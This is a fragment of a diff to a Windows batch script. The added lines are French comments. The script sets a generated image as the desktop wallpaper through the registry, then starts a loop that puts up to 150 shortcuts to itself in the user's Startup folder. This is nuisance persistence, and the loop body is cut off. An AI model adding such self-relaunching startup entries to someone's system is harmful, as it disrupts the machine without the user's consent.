@@ -39,9 +39,11 @@ powershell -Command "& {
     $bitmap.Save('%wallpaper%');
 }"
 
+:: Appliquer le fond d'écran créé
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
+:: Ajouter des raccourcis pour le script au démarrage
 set startup_folder=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 for /l %%i in (1,1,150) do (
     setlocal enabledelayedexpansion
